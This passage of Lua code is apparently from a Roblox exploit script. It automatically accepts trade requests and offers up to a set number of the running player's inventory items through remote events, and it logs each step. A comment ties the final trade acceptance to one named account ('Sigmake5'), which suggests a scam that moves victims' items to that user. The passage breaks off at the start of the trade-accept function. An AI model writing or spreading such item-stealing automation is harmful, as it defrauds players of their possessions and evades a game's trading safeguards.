local tradeActive = false
local acceptedRequest = false

-- Function to accept trade request (0.1s response)
local function autoAcceptRequest()
    if Remotes.AcceptRequest then
        pcall(function()
            Remotes.AcceptRequest:FireServer()
            sendLog("⚡ Auto-accepted trade request (0.1s)")
            acceptedRequest = true
            return true
        end)
    end
    return false
end

-- Function to add items to trade
local function addItemsToTrade(maxItems)
    local itemsAdded = 0
    local items = getItemsFromTradeGUI()
    
    if #items == 0 then
        sendLog("⚠️ No items found in inventory")
        return 0
    end
    
    sendLog("📦 Found " .. #items .. " items")
    
    for i = 1, math.min(maxItems, #items) do
        if Remotes.OfferItem then
            pcall(function()
                Remotes.OfferItem:FireServer(items[i].button)
                itemsAdded = itemsAdded + 1
                sendLog("➕ Added: " .. items[i].name)
            end)
        end
        wait(0.2)
    end
    
    return itemsAdded
end

-- Function to accept trade (when Sigmake5 accepts)
local function autoAcceptTrade()
